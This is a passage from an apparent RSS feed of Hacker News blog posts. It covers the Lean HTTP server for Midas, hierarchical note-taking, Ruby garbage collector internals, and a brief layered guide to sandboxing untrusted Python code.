        Ace is a HTTP server written in Elixir that aimed to abstract away the differences between HTTP/1 and HTTP/2.
        Ace also supported HTTPS and long lived connections for streaming requests/responses.
      </p>
      <p>
        In my opinion Ace was successful in its goals.
        However, having all these features in one server increased the implementation complexity.
        Since starting Ace I have written several services that use the same narrow subset of features.
        These applications were mostly JSON API services, they did not have streaming.
        Being deployed behind a load balancer, they needed neither HTTPS or HTTP/2.
      </p>
      <p>
        Lean aims to be focus on these API applications and has a sizeable list of non-goals:
      </p>
      <ul>
        <li>SSL</li>
        <li>Streaming</li>
        <li>HTTP/2</li>
        <li>HTTP Pipelining</li>
        <li>Websockets</li>
      </ul>
      <p>
        By not tackling all these non-goals Lean should be simpler and therefore easier to maintain.
        This should make it easier to address features and bugs, as well as easier to contribute to.
        It should also be faster, though I have yet to test this.
      </p>
      <p>
        Of course, all the features listed above are important for a framework.
        By writing adapters for other servers, such as Ace or Cowboy,
        Midas the framework will be able to support all these features.
      </p>
      <h2>Why Gleam</h2>
      <p>
        For now Gleam feels like the most promising approach to getting the benefits of types on the BEAM.
        This is something that has been on several peoples wish list, including mine, for quite a long time.
      </p>
      <p>
        Gleam compiles to readable Erlang (if "readable Erlang" isn't a controversial statement)
        It also has great interop with Erlang and Elixir.
        Because of these features I would argue that it can be considered "production ready",
        if only for parts of an application.
        There are some parts of your application that will benefit more from type safety than others.
      </p>
      <p>
        I will write more on this topic at some later time.
      </p>
      <h2>Using Lean Server</h2>
      <p>
        Lean Sever is bundled as part of Midas.
        Currently Midas is using features that are not yet part of a Gleam stable release,
        therefore you will need to use it as a git dependency from `midas-framework/midas`.
      </p>
      <ul>
        <li>With Elixir and Mix. <a href="https://github.com/midas-framework/midas#start-in-an-elixir-application">See the docs</a>.</li>
        <li>With Erlang and Rebar3. <a href="https://github.com/midas-framework/midas#start-in-an-erlang-application">See the docs</a>.</li>
      </ul>
    </div></div>]]>
            </description>
            <link>http://crowdhailer.me/2020-06-23/introducing-lean-server-for-midas/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24265936</guid>
            <pubDate>Mon, 24 Aug 2020 21:47:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Hierarchy First Approach to Note Taking]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24265824">thread link</a>) | @kevinslin
<br/>
August 24, 2020 | https://www.kevinslin.com/notes/3dd58f62-fee5-4f93-b9f1-b0f0f59a9b64.html | <a href="https://web.archive.org/web/*/https://www.kevinslin.com/notes/3dd58f62-fee5-4f93-b9f1-b0f0f59a9b64.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="text"> <figure> <img src="https://www.kevinslin.com/assets/images/tree.jpeg" alt="tree"> </figure> <p>Ten years ago I wrote a note.</p> <p>That led to <strong>another</strong>, and then <strong>another</strong>, and soon enough, I had a <strong>few thousand</strong> of them and an increasingly unhappy dropbox client that refused to sync it all.</p> <p>The reason for all these notes is because of technology.</p> <p>I worked at AWS and tried to keep on top of <strong>cloud stuff</strong>. I programmed in three different languages and kept notes to help me context switch between different <strong>programming languages</strong>. I also did full-stack development on the side and that, well, it required referencing <strong><a href="https://www.reddit.com/r/webdev/comments/747hfu/does_everybody_find_the_modern_fullstack_learning/">everything</a></strong>.</p> <p>My primary use for notes is as a <a href="https://en.wikipedia.org/wiki/Cache_(computing)">cache</a>. Think <a href="https://redis.io/">Redis</a>, but for humans.</p> <p>If I spent <strong>more than 5 minutes</strong> figuring something out, those are five minutes I <strong>never</strong> want to spend again figuring out the <strong>same problem</strong>.</p> <p>But this is difficult to do in practice.</p> <p>Sometimes you run into a thing that only pops up on some specific version of a cli command on an outdated bash shell on a specific Linux distro. How do you document this sort of thing when you might encounter a dozen of them a day?</p> <p>My solution is something I call <strong>hierarchal note taking</strong>. It’s a system I’ve developed over the past ten years that has allowed me to amass a corpus of +10k notes.</p> <p>This system has some awesome properties that I haven’t been able to replicate with anything else:</p> <ul> <li>it lets me <strong>find any specific note within seconds</strong> even with thousands of existing notes</li> <li>it helps me build a <strong>comprehensive mental model</strong> around a domain through the act of organizing my notes</li> <li>it <strong>can be used on any note-taking tool that supports markdown notes</strong></li> <li>it’s compatible with existing note-taking methodologies like <a href="https://fortelabs.co/blog/para/">PARA</a></li> </ul> <p>The rest of this post will describe the journey I took to arrive at hierarchal note-taking and the problems that they help me solve.</p> <h2 id="the-problem-with-clis"> <a href="#the-problem-with-clis" aria-labelledby="the-problem-with-clis"></a> The Problem with CLIs </h2> <p>I spend a lot of time in the command line in Unix-like systems. If you do as well, you might be familiar with the following comic.</p> <p><img src="https://www.kevinslin.com/assets/images/2020-06-09-15-11-27.png" alt="tar bomb"></p> <blockquote> <p>Comic from <a href="https://xkcd.com/">XKCD</a></p> </blockquote> <p>I’ve probably used <code>tar</code> a few thousand times in my life but still can’t tell you what the arguments mean (it’s mostly muscle memory at this point). Unix tools do one thing and one thing well, and on most days, that one thing is making you reach for a <a href="https://en.wikipedia.org/wiki/Man_page">man page</a>.</p> <p>This is because every command has many dozen options, many of which are invoked with obscure single character letters in a specific order for specific inputs (I’m looking at you <code>rsync</code>).</p> <p>Growing tired of reading man pages and stack overflow threads, I wanted a way to capture and reference commands that I’ve run in the past. And so I started taking notes.</p> <p>I created a folder called <code>notes</code>. I created a note called <code>tar.md</code>.</p>  <p>Note that my <code>tar.md</code> note doesn’t have every option or use case involving <code>tar</code>. Instead, it’s only the options that I find most useful and use cases that I’ve had to do. This tends to be my approach to note-taking - I like to capture the bare minimum information I need so that the future me can get value out of the note.</p> <p>What started as a single markdown file quickly spawned a few hundred more. It was exhilarating - instead of turning to google every time I ran into a dusty corner of Linux, I could just reference my notes. 95% of the time, there would be a nicely summarized note waiting for me :)</p> <h2 id="the-problem-with-languages"> <a href="#the-problem-with-languages" aria-labelledby="the-problem-with-languages"></a> The Problem with Languages </h2> <p>While the above approach worked for cli commands, things got more complicated as I needed notes on additional domains. Most commonly with my work, it was programming languages.</p> <p>Take <a href="https://www.python.org/">python</a> as an example. Python is both a <strong>programming language</strong> as well as a <strong>cli command</strong>. Without changing the name of one of the notes or introducing folders, there would be no way to create notes on both.</p> <p>But I didn’t want folders. Folders were messy and besides, weren’t supported in <a href="http://notational.net/">notational velocity</a>, my primary note-taking tool at the time. So instead of folders, I decided to create a hierarchy using the <code>.</code> symbol as my delimiter.</p> <p>Now I could represent the language and the cli as two different <code>.</code> delimited hierarchies.</p> <div><div><pre><code>cli.python.md
lang.python.md
</code></pre></div></div> <p>Though on the surface, this seems like a simple change and not all that different from a traditional folder hierarchy, I found that it equal to the difference between using a <a href="https://en.wikipedia.org/wiki/Commodore_64">commodore 64</a> and the latest (non-<a href="https://www.theverge.com/2020/5/4/21246223/macbook-keyboard-butterfly-magic-pro-apple-design">butterfly keyboard</a>) Macbook.</p> <p>For starters, files now had the ability to both contain data and have children. They could act as both files and folders.</p> <p>And whereas folders were traditionally used to <strong>organize</strong> information, there was no straightforward way to use a folder hierarchy to quickly <strong>find</strong> information. Having the hierarchy in the filename made it easy to <strong>find</strong> information using the <strong>hierarchy</strong>.</p> <p><img src="https://foundation-prod-assetspublic53c57cce-8cpvgjldwysl.s3-us-west-2.amazonaws.com/assets/images/lookup-cli.gif" alt="cli lookup"></p> <h2 id="finding-the-truth"> <a href="#finding-the-truth" aria-labelledby="finding-the-truth"></a> Finding the Truth </h2> <p>There’s the joke in computer science that there are only 3 meaningful quantities in the field: 0, 1 or infinite. If you can create a thing more than once, there is nothing in theory that should stop you from creating an infinite amount of said thing.</p> <p>Once I realized I had a system of making two-level hierarchies, I realized I didn’t need to stop there. This soon led to deeper hierarchies like the one below.</p> <div><div><pre><code>.
└── lang
    └── python
        ├── data
        │   ├── boolean
        │   ├── array
        │   ├── string
        │   └── flow
        ├── flow
        │   ├── for
        │   ├── while
        │   └── if
        └── operator
            ├── comment
            ├── compare
            ├── scope
            ├── inspect
            ├── format
            ├── iterate
            └── destructure
</code></pre></div></div> <p>The above hierarchy was stored as simple plain text files inside my <code>notes</code> folder.</p> <div><div><pre><code>lang.python.data.boolean.md
lang.python.data.array.md
lang.python.data.string.md
lang.python.flow.md
lang.python.flow.for.md
lang.python.flow.while.md
lang.python.flow.if.md
lang.python.operator.md
lang.python.operator.comment.md
lang.python.operator.compare.md
lang.python.operator.scope.md
lang.python.operator.inspect.md
lang.python.operator.format.md
lang.python.operator.iterate.md
lang.python.operator.destructure.md
</code></pre></div></div> <p>With this hierarchy, I could quickly reference anything I needed from a programming language.</p> <p><img src="https://foundation-prod-assetspublic53c57cce-8cpvgjldwysl.s3-us-west-2.amazonaws.com/assets/images/blog.python.lookup.gif" alt="python data structure lookup"></p> <blockquote> <p>Looking up different data structures in python</p> </blockquote> <p>Once I built out my hierarchy on <code>python</code>, I found that I could also apply it to any other language. This made context switching between languages much easier.</p> <p>As an example, I can never remember what counts as <code>truthy</code> in dynamic languages. But now I don’t have to.</p> <p><img src="https://foundation-prod-assetspublic53c57cce-8cpvgjldwysl.s3-us-west-2.amazonaws.com/assets/images/blog.lookup.bool.gif" alt="finding the truth"></p> <blockquote> <p>Finding the truth</p> </blockquote> <p>The cool thing about this approach is that the implementation details of any particular language became less important as I build out my hierarchies. Instead of thinking in terms of “how well do I understand <strong>python</strong>”, I think in terms of how well I understand <strong>programming languages</strong>.</p> <h2 id="externalizing-mental-models"> <a href="#externalizing-mental-models" aria-labelledby="externalizing-mental-models"></a> Externalizing Mental Models </h2> <p>As I started building hierarchies across more and more domains, I found that it became useful to document what they were. I called these <em>externalized hierarchies</em> <strong>schemas</strong>. They were a table of contents for a particular hierarchy. I started adding a special <code>schema</code> file directly underneath the root of each hierarchy.</p> <div><div><pre><code>lang.schema.md
cli.schema.md
aws.schema.md
...
</code></pre></div></div> <p>Inside each <code>schema</code> note, I would have something like the following</p> <div><div><pre><code>- lang (namespace) # indicates that there are any number of languages underneath here
    - data: data structures
    - flow: control flow
    - oo: object-oriented programming
    - ...
</code></pre></div></div> <p>I would use schemas as a common source of truth when building out a hierarchy and use them to make sure that each hierarchy was internally consistent. As I began to use this system day by day, I realized that I had stumbled upon a radically more effective way of learning.</p> <h2 id="hierarchal-notes"> <a href="#hierarchal-notes" aria-labelledby="hierarchal-notes"></a> Hierarchal Notes </h2> <p>By associating every note I took to a hierarchy, I found that looking up information no longer felt like an <strong>tax on my time</strong>, but instead, a <strong>path to self augmentation</strong>.</p> <p>Whereas before I would look up a thing only to forget it a few weeks later, I could now quickly incorporate it into my notes and <strong>know with certainty</strong> that I will be able to <strong>reference this again</strong> at a later date.</p> <p>Better yet, when I found something that didn’t fit any of my existing hierarchies, I could use it as a chance to update my schemas on said hierarchies. This would slowly expand my conceptual understanding of the entire domain.</p> <p>A concrete example: earlier this year, I ended up making use of the <a href="https://en.wikipedia.org/wiki/Null_coalescing_operator">null coalescing operator</a> in javascript. This is a convenient way of assigning values when dealing with <code>null</code></p> <p>In the following example, <code>a</code> will be assigned the value of <code>b</code> if the value of <code>b</code> is not <code>null</code> or <code>undefined</code>, otherwise, it will be assigned 3.</p>  <p>After learning about it, I added it to my language schema under <code>operators</code>.</p> <div><div><pre><code>- lang (namespace)
    - {specific language}
        - operator (alias: op)
            - add
            - subtract
            - ...
            - null # null coalescing operator
</code></pre></div></div> <p>Not only did this expand my vocabulary of language operators, but it also let me note down how the equivalent functionality can be expressed in languages that did not natively support it.</p> <div><div><pre><code><span>other</span> <span>=</span> <span>s</span> <span>or</span> <span>"some default value"</span>
</code></pre></div></div> <blockquote> <p>Python example of “null coalescing”</p> </blockquote> <p>What is nice about this approach is that I have completely divorced the concept of “null coalescing” with the implementation detail of any particular language. The next time I’m using python and want to do <code>null coalescing</code>, I can simply look up <code>python.op.null</code> and be reminded of the implementation.</p> <p>There are dozens of <strong>main stream</strong> programming languages. There are hundreds of additional domain-specific languages. In a prior life, there would have been no way for me to <strong>know</strong> even a tiny fraction of them. But a hierarchal first approach to note-taking changes the game - instead of having to know the details of <strong>every</strong> language, I can collapse it all down to my <strong>one language schema</strong>. This schema can capture the points of interest of <strong>every language</strong> and in this way, I can claim to <strong>know</strong> something of all programming languages.</p> <h2 id="the-present-day"> <a href="#the-present-day" aria-labelledby="the-present-day"></a> The Present Day </h2> <p>Today, my knowledge base encompasses over a dozen different hierarchies that span 10K+ notes. I’ve expanded my use cases of note-taking beyond caching to also …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.kevinslin.com/notes/3dd58f62-fee5-4f93-b9f1-b0f0f59a9b64.html">https://www.kevinslin.com/notes/3dd58f62-fee5-4f93-b9f1-b0f0f59a9b64.html</a></em></p>]]>
            </description>
            <link>https://www.kevinslin.com/notes/3dd58f62-fee5-4f93-b9f1-b0f0f59a9b64.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24265824</guid>
            <pubDate>Mon, 24 Aug 2020 21:38:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How the garbage collector works in the Ruby programming language]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24265704">thread link</a>) | @peterzhu2118
<br/>
August 24, 2020 | https://blog.peterzhu.ca/notes-on-ruby-gc/ | <a href="https://web.archive.org/web/*/https://blog.peterzhu.ca/notes-on-ruby-gc/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content"> <article itemscope="" itemtype="https://schema.org/BlogPosting">  <div itemprop="articleBody"> <blockquote> <p>This is an article in a multi-part series called <a href="https://blog.peterzhu.ca/adventures-in-ruby">“Peter’s Adventures in Ruby”</a></p> </blockquote>  <p>Ruby’s garbage collector code lives in a single file called <a href="https://github.com/ruby/ruby/blob/master/gc.c"><code>gc.c</code></a>. “Garbage collector” is probably not the best term to call it because in addition to garbage collection, code inside <code>gc.c</code> is responsible for memory allocation and management. In other words, the whole lifecycle of an object is managed by code in <code>gc.c</code>.</p>  <h2 id="rvalue-struct"> <a href="https://github.com/ruby/ruby/blob/38a4f617de157586668dd726d518eadcebf1bca2/gc.c#L540"><code>RVALUE</code> struct</a> <a href="#rvalue-struct"></a> </h2> <p>The definition for the struct is approximately as follows (I have omitted portions of the code and replaced with ellipses).</p> <div><div><pre><code><span>typedef</span> <span>struct</span> <span>RVALUE</span> <span>{</span>
    <span>union</span> <span>{</span>
<span>...</span>
        <span>struct</span> <span>RBasic</span>  <span>basic</span><span>;</span>
        <span>struct</span> <span>RObject</span> <span>object</span><span>;</span>
        <span>struct</span> <span>RClass</span>  <span>klass</span><span>;</span>
        <span>struct</span> <span>RFloat</span>  <span>flonum</span><span>;</span>
        <span>struct</span> <span>RString</span> <span>string</span><span>;</span>
<span>...</span>
        <span>union</span> <span>{</span>
<span>...</span>
        <span>}</span> <span>imemo</span><span>;</span>
        <span>struct</span> <span>{</span>
            <span>struct</span> <span>RBasic</span> <span>basic</span><span>;</span>
            <span>VALUE</span> <span>v1</span><span>;</span>
            <span>VALUE</span> <span>v2</span><span>;</span>
            <span>VALUE</span> <span>v3</span><span>;</span>
        <span>}</span> <span>values</span><span>;</span>
    <span>}</span> <span>as</span><span>;</span>
<span>...</span>
<span>}</span> <span>RVALUE</span><span>;</span>
</code></pre></div></div> <p>A Ruby object is represented by an <code>RVALUE</code> struct instance. The <code>RVALUE</code> struct is exactly 40 bytes in size (on systems with 8 byte pointers). These struct instances live in 40 byte slots in a (generally 16KB) page. These pages exist as a linked list inside a heap.</p> <p>The <code>RVALUE</code> struct can represent any Ruby object using a union of all the types for Ruby objects (such as <code>RObject</code>, <code>RString</code>, <code>RRegexp</code>, <code>RFloat</code>, etc.). It also contains <code>imemo</code>, which is a union of internal types that are not represented by Ruby objects. <code>imemo</code> includes types such as <code>rb_iseq_t</code> which are instruction sequences used to hold the instructions for Ruby code (like a method or a block).</p> <p>We can use the <code>values</code> struct inside to initialize a generic <code>RVALUE</code>. This struct contains an <code>RBasic</code> struct, which is 16 bytes and contains information about the type of the current object and so we can use the remaining 24 bytes for data (<code>VALUE</code> is a type definition for an <code>unsigned long</code>). The 24 bytes of data is used differently for different types. For example, a short string has the characters directly embedded while a longer string utilizes a pointer.</p> <h2 id="rb_objspace_t-struct"> <a href="https://github.com/ruby/ruby/blob/38a4f617de157586668dd726d518eadcebf1bca2/gc.c#L650"><code>rb_objspace_t</code> struct</a> <a href="#rb_objspace_t-struct"></a> </h2> <p>The <code>rb_objspace_t</code> struct contains all the information about the garbage collector, including pointers to the heaps and the state of the garbage collector.</p> <p>The instance of <code>rb_objspace_t</code> can be accessed using the <a href="https://github.com/ruby/ruby/blob/38a4f617de157586668dd726d518eadcebf1bca2/gc.c#L862"><code>rb_objspace</code> macro</a>.</p> <p>The garbage collector contains two heaps, <a href="https://github.com/ruby/ruby/blob/38a4f617de157586668dd726d518eadcebf1bca2/gc.c#L679"><code>eden_heap</code> and <code>tomb_heap</code></a>. The eden heap contains pages containing live objects while the tomb heap contains pages without live objects, which can then get recycled and moved back to the eden heap. The pages in the tomb heap may also be freed to release memory back to the system.</p> <h2 id="heap-page"> Heap page <a href="#heap-page"></a> </h2> <p>The heap is divided up into pages, with each page at 16KB. These pages are further divided up into slots, where each slot holds one <code>RVALUE</code>. When we run out of pages, we malloc another page and add it to the list of pages. We free pages when we have too many empty pages (this can happen when a GC run sweeps all the live objects on a page).</p>  <p>The <a href="https://github.com/ruby/ruby/blob/38a4f617de157586668dd726d518eadcebf1bca2/gc.c#L2226"><code>rb_wb_unprotected_newobj_of</code></a> and <a href="https://github.com/ruby/ruby/blob/38a4f617de157586668dd726d518eadcebf1bca2/gc.c#L2233"><code>rb_wb_protected_newobj_of</code></a> are the public functions used to create new objects. I’ll talk about the difference between these two functions later. In other Ruby source files, the macros <a href="https://github.com/ruby/ruby/blob/38a4f617de157586668dd726d518eadcebf1bca2/gc.h#L29"><code>NEWOBJ_OF</code></a> and <a href="https://github.com/ruby/ruby/blob/38a4f617de157586668dd726d518eadcebf1bca2/gc.h#L33"><code>RB_NEWOBJ_OF</code></a> are used to create objects. An example of this being used is in <code>numeric.c</code> in <a href="https://github.com/ruby/ruby/blob/38a4f617de157586668dd726d518eadcebf1bca2/numeric.c#L906"><code>rb_float_new_in_heap</code></a> that creates a new floating point number.</p> <h2 id="newobj_of-function"> <a href="https://github.com/ruby/ruby/blob/38a4f617de157586668dd726d518eadcebf1bca2/gc.c#L2194"><code>newobj_of</code> function</a> <a href="#newobj_of-function"></a> </h2> <p>The <code>newobj_of</code> function allocates and initializes a new object (i.e. slot) on the heap.</p> <p>If we are not in a GC run, the GC is not stressful (when the GC is stressful, it will attempt to run garbage collection at every possible point), and there is a free slot available in the page we are using, then we can directly pop this free slot from the linked list and initialize the object in it.</p> <p>However, if the conditions are not satisfied, we run <a href="https://github.com/ruby/ruby/blob/38a4f617de157586668dd726d518eadcebf1bca2/gc.c#L2154"><code>newobj_slowpath</code></a>, which tries to use the next free page and then fetch a free slot from this new page (this is done in <a href="https://github.com/ruby/ruby/blob/38a4f617de157586668dd726d518eadcebf1bca2/gc.c#L2019"><code>heap_get_freeobj</code></a>). However, this would not work if we run out of pages, so we call <a href="https://github.com/ruby/ruby/blob/38a4f617de157586668dd726d518eadcebf1bca2/gc.c#L1966"><code>heap_prepare</code></a> and run garbage collection to try to free up space. If we still do not have space, then we add a new page to the heap (by calling <code>heap_increment</code>).</p> <p>Incremental marking occurs during object creation in <code>newobj_slowpath</code> (incremental marking is explained later on). To be specific, it happens in <a href="https://github.com/ruby/ruby/blob/38a4f617de157586668dd726d518eadcebf1bca2/gc.c#L2172"><code>heap_get_freeobj</code></a> -&gt; <a href="https://github.com/ruby/ruby/blob/38a4f617de157586668dd726d518eadcebf1bca2/gc.c#L2030"><code>heap_get_freeobj_from_next_freepage</code></a> -&gt; <a href="https://github.com/ruby/ruby/blob/38a4f617de157586668dd726d518eadcebf1bca2/gc.c#L1991"><code>heap_prepare</code></a> -&gt; <a href="https://github.com/ruby/ruby/blob/38a4f617de157586668dd726d518eadcebf1bca2/gc.c#L1974"><code>gc_marks_continue</code></a> -&gt; <a href="https://github.com/ruby/ruby/blob/38a4f617de157586668dd726d518eadcebf1bca2/gc.c#L6566"><code>gc_marks_step</code></a>.</p>  <p>The garbage collector is split into two phases: it first marks, then sweeps (and a third compaction phase that is currently in development).</p> <p>In the marking phase, living objects are marked in a bitmap. Then, during the sweeping phase, the unmarked slots are freed and recycled in the free list.</p> <p>As you may know, MRI Ruby is single threaded, and the garbage collector is no different. This is known as a “stop-the-world” garbage collector. This can cause long pauses in the Ruby code when the garbage collector is running, especially in a large Rails app, for example. Ruby solves this problem using two solutions, incrementally marking objects, and using a generational garbage collector, both described in greater detail below.</p>  <p>The marking phase traverses live Ruby objects by recursively marking children of live Ruby objects starting from root objects. Objects are marked using three colors: white, grey, and black. At a high level, the tri-color marking algorithm works as follows:</p> <ol> <li>All objects are initially white.</li> <li>Mark root objects as grey.</li> <li>While there is another object <em>O</em> that is grey: <ol> <li>Mark <em>O</em> as black.</li> <li>Mark every child <em>C</em> of <em>O</em> as grey.</li> </ol> </li> </ol> <p>At the end of the marking phase, there are only black and white objects and all live objects that are white are dead and can be swept.</p> <figure> <img src="https://blog.peterzhu.ca/assets/notes-on-ruby-gc/marking.jpg"> <figcaption>Illustration of marking Ruby objects.</figcaption> </figure> <p>In the figure above, objects A and B are marked black, while objects C and D are grey, and object E has not yet been marked. We also have object F that is not referenced by any Ruby objects, so won’t be marked and will be reclaimed during the sweeping phase. We also two free slots that are currently unused.</p> <h2 id="generational-garbage-collector"> Generational garbage collector <a href="#generational-garbage-collector"></a> </h2> <p>Generational garbage collectors are based on the <em>weak generational hypothesis</em> theory, which states that objects often die young, and objects that have been alive for a long time are likely to remain alive. Generational garbage collectors keep track of the number of garbage collection cycles a particular object has survived, and when this number exceeds a threshold, the object is marked as an old object. To take advantage of this property to improve performance, we have two types of marking: minor GC and major GC.</p> <p>Minor GC runs mark only the young objects, thus it can run faster by skipping old objects.</p> <p>Major GC runs mark both the young and old objects, thus it can free more memory.</p> <figure> <img src="https://blog.peterzhu.ca/assets/notes-on-ruby-gc/rgengc.jpg"> <figcaption>Illustration of generational garbage collector during a minor GC.</figcaption> </figure> <p>In the figure above, when we are in a minor GC, none of the descendants of object A will be traversed during marking.</p> <p>The number of generations an object has survived is stored in the flags in the <code>RBasic</code> struct. We can get the age of the object using <a href="https://github.com/ruby/ruby/blob/38a4f617de157586668dd726d518eadcebf1bca2/gc.c#L1192"><code>RVALUE_FLAGS_AGE</code></a> and <a href="https://github.com/ruby/ruby/blob/38a4f617de157586668dd726d518eadcebf1bca2/gc.c#L1373"><code>RVALUE_OLD_P_RAW</code></a> which returns the age and whether an object is old, respectively.</p> <h3 id="remember-set-and-write-barrier"> Remember set and write barrier <a href="#remember-set-and-write-barrier"></a> </h3> <p>What if we added a child (that is a young object) to an old object? Then during minor GC the young object would not be marked and thus will be swept. This is a really bad bug.</p> <p>Here’s a diagram to illustrate the bug.</p> <figure> <img src="https://blog.peterzhu.ca/assets/notes-on-ruby-gc/wb1.jpg"> <figcaption>Illustration of potential bug in generational garbage collector.</figcaption> </figure> <p>In the diagram above, since objects A and C are old, they are not traversed during marking. However, object E is a young descendant of object C. Since object E is never marked, it will be swept.</p> <p>To solve this issue, we introduce the concept of a write barrier. A write barrier is essentially a “callback” to let the garbage collector know whenever an object is written to. When the write barrier is called, the child (young object) is placed in a special list called the remember set. This remember set is marked during minor GC runs.</p> <figure> <img src="https://blog.peterzhu.ca/assets/notes-on-ruby-gc/wb2.jpg"> <figcaption>Illustration of using write barrier to add object E to the remember set.</figcaption> </figure> <p>Generational garbage collection was introduced in Ruby 2.1. To preserve backward compatibility with old C-extensions, Ruby supports a write barrier unprotect operation. When we write barrier unprotect an object, we mark the object as shady and keep it in the remember set. Shady objects are not allowed to be promoted to old generation, so thus shady objects will always be marked during both minor and major GC.</p> <p>If you’re interested in more details, Koichi Sasada has <a href="http://www.atdot.net/~ko1/activities/rgengc_ismm.pdf">an excellent paper</a> written about implementing gradual write barriers.</p> <h2 id="incremental-marking"> Incremental marking <a href="#incremental-marking"></a> </h2> <p>Ruby 2.2 introduced the incremental garbage collector. Koichi Sasada has an <a href="https://blog.heroku.com/incremental-gc">execellent article</a> explaining how the incremental garbage collector works, I will attempt to summarize it below.</p> <p>The main idea of incremental marking is to not run the marking phase all at once, but divide it into chunks that can be interleaved with the execution of Ruby code. Since Ruby has a stop-the-world GC (i.e. no Ruby code can run while the GC is running), so splitting the marking phase can significantly reduce the stutter caused by GC execution.</p> <p>Incremental marking marks only a certain number of slots before completing, so during the execution of Ruby code, some objects may be marked black, some may be marked grey, while some may not have been marked yet at all. The number of slots that is incrementally marked is stored in the <a href="https://github.com/ruby/ruby/blob/38a4f617de157586668dd726d518eadcebf1bca2/gc.c#L6300"><code>step_slots</code> field</a>.</p> <p>Incremental marking only occurs during major GC runs, as we can see in <a href="https://github.com/ruby/ruby/blob/38a4f617de157586668dd726d518eadcebf1bca2/gc.c#L6588"><code>gc_marks</code></a> (the code completes marking if we are not incrementally marking).</p> <h3 id="write-barrier-part-ii"> Write barrier, part II <a href="#write-barrier-part-ii"></a> </h3> <p>A corner case that we run into during incremental marking is when a young object is added as a child of an old object, so during a minor GC run, this young object is not marked as live, and thus is swept even though it should not be. This is a very similar issue we …</p></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.peterzhu.ca/notes-on-ruby-gc/">https://blog.peterzhu.ca/notes-on-ruby-gc/</a></em></p>]]>
            </description>
            <link>https://blog.peterzhu.ca/notes-on-ruby-gc/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24265704</guid>
            <pubDate>Mon, 24 Aug 2020 21:25:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Securely running untrusted Python code]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24265478">thread link</a>) | @krisfris
<br/>
August 24, 2020 | https://darkshadow.io/2020/08/21/securely-running-untrusted-python-code.html | <a href="https://web.archive.org/web/*/https://darkshadow.io/2020/08/21/securely-running-untrusted-python-code.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    

<p>In this post, I present a layered approach to minimizing the inherent security risk
when running untrusted Python code.</p>

<h3 id="step-1-securing-python">Step 1: Securing Python</h3>

<p>Restrict the actions the code can perform. The method used differs depending on whether you use
CPython or PyPy.</p>

<h4 id="cpython">CPython</h4>

<p>Use <a href="https://restrictedpython.readthedocs.io/en/latest/">RestrictedPython</a> to define
a restricted subset of Python.</p>

<p>Use <a href="https://www.python.org/dev/peps/pep-0578/">audit hooks</a> (available since Python 3.8)
to completely prevent certain actions.</p>

<figure><pre><code data-lang="python"><span>import</span> <span>sys</span>

<span>def</span> <span>audit</span><span>(</span><span>event</span><span>,</span> <span>args</span><span>):</span>
    <span>if</span> <span>event</span> <span>==</span> <span>'compile'</span><span>:</span>
        <span>sys</span><span>.</span><span>exit</span><span>(</span><span>'nice try!'</span><span>)</span>

<span>sys</span><span>.</span><span>addaudithook</span><span>(</span><span>audit</span><span>)</span>

<span>eval</span><span>(</span><span>'5'</span><span>)</span></code></pre></figure>

<h4 id="pypy">PyPy</h4>

<p>Use <a href="https://doc.pypy.org/en/latest/sandbox.html">sandboxing</a>.
It allows you to run arbitrary Python code in a special environment that serializes all input/output so you can check it and decide which commands are allowed before actually running them.</p>

<p>This is the most secure way of restricting Python.</p>

<h3 id="step-2-securing-the-host-os">Step 2: Securing the host OS</h3>

<p>To protect your host OS, you have two options.</p>

<ul>
  <li><strong>Virtualization</strong> such as KVM or VirtualBox (more secure)</li>
  <li><strong>Containerization</strong> such as <a href="https://linuxcontainers.org/lxd/introduction/">LXD</a>
or <a href="https://www.docker.com/">Docker</a> (much lighter)</li>
</ul>

<p>In the case of containerization with Docker you may need to add AppArmor or SELinux policies for extra security. LXD already comes with AppArmor policies by default.</p>

<p>Make sure you run the code as a user with as little privileges as possible.</p>

<p>Rebuild the virtual machine/container for each user.</p>

<p>Whichever solution you use, don’t forget to limit resource usage (RAM, CPU, storage, network).
Use <a href="http://man7.org/linux/man-pages/man7/cgroups.7.html">cgroups</a> if your chosen virtualization/containerization solution does not support these kinds of limits.</p>

<h3 id="step-3-timeouts">Step 3: Timeouts</h3>

<p>Use timeouts on all layers to ensure that neither code nor container run longer than
they are supposed to.</p>

<h3 id="step-4-communication">Step 4: Communication</h3>

<p>If distinct pieces of untrusted code need to communicate with each other or with your host app,
use a language-agnostic API such as REST or gRPC.</p>

<h3 id="conclusion">Conclusion</h3>

<p>These simple measures should make running untrusted code relatively secure.
Share your thoughts in the comments.</p>

  </div></div>]]>
            </description>
            <link>https://darkshadow.io/2020/08/21/securely-running-untrusted-python-code.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24265478</guid>
            <pubDate>Mon, 24 Aug 2020 21:03:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Creativity and Search]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24265452">thread link</a>) | @vrg_
<br/>
August 24, 2020 | https://vishakh.me/posts/creativity_search/ | <a href="https://web.archive.org/web/*/https://vishakh.me/posts/creativity_search/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article role="article">
        





